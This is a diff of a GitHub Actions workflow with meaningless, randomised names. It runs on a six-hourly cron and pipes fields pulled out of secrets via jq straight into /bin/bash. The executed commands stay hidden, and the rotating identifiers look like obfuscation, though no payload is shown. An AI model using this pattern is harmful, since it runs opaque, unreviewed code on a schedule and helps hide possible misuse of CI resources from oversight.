@@ -1,9 +1,8 @@
 name: yangxiong19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 1/6 * * *'
+    - cron: '11 3/6 * * *'
 
 jobs:
   build:
@@ -13,14 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangxiong19871010
         env:
-          cdu848: ${{ secrets.cdu848 }}
+          sobt338: ${{ secrets.sobt338 }}
         run: |
-          echo $cdu848 | jq -r .eyuiu862 | /bin/bash
-          echo $hg736 | jq -r .klka0803 | /bin/bash
-          echo $wv39729 | jq -r .iam6263 | /bin/bash
-          echo $vpt873 | jq -r .qdq24486 | /bin/bash
-          echo $aky6717 | jq -r .ffd57 | /bin/bash
-          echo $ceu9439 | jq -r .lj90 | /bin/bash
-          echo $gs87882 | jq -r .rlacg28705 | /bin/bash
-          echo $gh44967 | jq -r .muk44329 | /bin/bash
+          echo $sobt338 | jq -r .r85832 | /bin/bash
+          echo $wn440 | jq -r .ygb9 | /bin/bash
+          echo $uyh2895 | jq -r .adn64987 | /bin/bash
+          echo $r88806 | jq -r .kja066 | /bin/bash
+          echo $dzval330 | jq -r .mneb1873 | /bin/bash
+          echo $fb75 | jq -r .iaa55693 | /bin/bash
+          echo $kay3 | jq -r .jnd05 | /bin/bash
+          echo $slyp98508 | jq -r .ldw863 | /bin/bash
+          echo $fm1470 | jq -r .jwsx67471 | /bin/bash
+          echo $gkkjw305 | jq -r .gs7 | /bin/bash
+          echo $p26636 | jq -r .jv9793 | /bin/bash
+          echo $lyl649 | jq -r .cntpb39 | /bin/bash
+          echo $wvsg955 | jq -r .y30 | /bin/bash
 
